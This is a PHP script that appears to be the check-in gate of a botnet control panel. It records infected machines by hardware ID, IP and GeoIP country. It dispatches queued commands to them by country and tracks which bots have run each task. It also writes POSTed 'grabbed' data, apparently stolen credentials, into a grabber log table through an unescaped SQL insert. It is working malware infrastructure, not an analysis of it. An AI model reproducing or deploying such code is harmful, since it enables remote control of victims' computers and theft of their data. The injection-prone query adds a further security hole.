    <?php
    //Connection
    require_once('inc/config.php');
    require_once('other/safe.php');
     
    //GeoIP
    require_once('other/geoip.php');
     
    if(!isset($_POST['grabbed'])){
    //GET
    $hwid = safe_xss($_GET['hwid']);
    $pc  = safe_xss($_GET['pc']);
     
    //Normal
    $install = date('Y-m-d H:i:s');
    $ip         = $_SERVER['REMOTE_ADDR'];
     
    // GeoIP
        $gi       = geoip_open('other/geoip.dat',GEOIP_STANDARD);
        $code       = geoip_country_code_by_addr($gi, $ip);
        geoip_close($gi);
           
        $country = strtolower($code);
       
        if(empty($code)){
            $country = '00';
        }
    // GeoIP
     
       
    //Exist
    $e = mysql_query("SELECT * FROM bots WHERE hwid = '".safe_sql($hwid)."'");
     
    if(!mysql_num_rows($e)){
        mysql_query("INSERT INTO bots
         (pc, ip, country, install, time, hwid) VALUES
         ('".safe_sql($pc)."','".safe_sql($ip)."','".safe_sql($country)."', '".safe_sql($install)."', '".safe_sql($install)."', '".safe_sql($hwid)."')");
    }else{
        mysql_query("UPDATE bots Set time = '".safe_sql($install)."',status = '1' WHERE hwid = '".safe_sql($hwid)."'");
    }
     
     
    //Multi tasking
    $query = mysql_query("SELECT country FROM bots WHERE hwid = '".safe_sql($hwid)."'");
    while($row = mysql_fetch_array($query))
    {
      $country_db = safe_xss($row['country']);
    }
     
        $time = time();
       
        $q1 = mysql_query("SELECT * FROM tasks WHERE countries LIKE '%".safe_sql($country_db)."%' OR countries = ''");
        while($row = mysql_fetch_array($q1))
        {
            $time_out = safe_xss($row['time']);
     
            //$date_old = new DateTime($time_out);
            //$date_new = $date_old->getTimestamp();    
     
            $date_old = date_create($row['time']); 
            $date_new = date_timestamp_get($date_old);
     
            if($date_new <= $time){        
                $command = $row['command'];
               
                    $q2 = mysql_query("SELECT * FROM tasks WHERE command = '".safe_sql($command)."'");
                        while($row = mysql_fetch_array($q2))
                         {
                            $done = safe_xss($row['done']);
                            $bots = safe_xss($row['bots']);
                            $add  = $done+1;
                         }
                         
                        if($done != $bots){
                            $q3    = "SELECT * FROM tasks_done WHERE hwid = '".safe_sql($hwid)."' AND command = '".safe_sql($command)."'";
                            $count = mysql_query($q3);
                   
                            if(!mysql_num_rows($count)){                                
                                echo '$'.$command.'$';
                               
                                mysql_query("UPDATE tasks Set done = '$add' WHERE command = '".safe_sql($command)."'");            
                                mysql_query("INSERT INTO tasks_done
                                         (hwid, command) VALUES
                                         ('".safe_sql($hwid)."', '".safe_sql($command)."')");
                            }
                        }                    
            }
        }
    }else{
        $string = $_POST['grabbed'];
        $tra = str_replace('3D', '', urldecode($string));
        mysql_query("INSERT INTO grabberlogs (string) VALUES ('$tra')");
    }
    ?>
